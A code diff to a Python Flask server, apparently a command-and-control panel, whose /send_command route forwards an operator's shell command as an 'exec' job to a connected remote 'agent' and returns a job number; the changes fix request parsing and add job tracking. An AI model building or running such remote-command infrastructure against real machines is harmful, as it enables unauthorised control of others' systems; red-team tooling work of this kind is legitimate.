@@ -9,6 +9,8 @@ from flask import Flask, request, jsonify
 from hashlib import sha256
 from uuid import uuid4
 
+import json
+
 app = Flask(__name__)
 
 @app.route("/login", methods=["POST"])
@@ -96,7 +98,7 @@ def get_listeners(session: str):
     return jsonify(listeners_row)
 
 @app.route("/send_command", methods=["POST"])
-def send_command(): # TODO: send command to agent, open websocket, send response and close  
+def send_command(): # TODO: send output to client 
     if request.json is None:
         return "JSON body is none", 500
 
@@ -105,17 +107,21 @@ def send_command(): # TODO: send command to agent, open websocket, send response
     if not session in list(clients_session.values()):
         return "Invalid session ID", 401
     
-    target_id: str = request.json("target")
-    command: str = request.json("cmd")
+    target_id: str = request.json["target"]
+    command: str = request.json["cmd"]
 
-    if not target_id in agents:
+    if not target_id in list(agents.keys()):
         return "Agent not found", 500
     
     agent = agents[target_id]
 
-    agent.send(command.encode())
-    agent.recv(BUFFER)
-    return ""
+    job_n = len(jobs.keys()) + 1
+
+    agent.send(json.dumps({"exec": command, "job": job_n}).encode())
+
+    jobs[job_n] = None
+    
+    return jsonify({"job": job_n})
 
 # TODO: Websocket chat
 
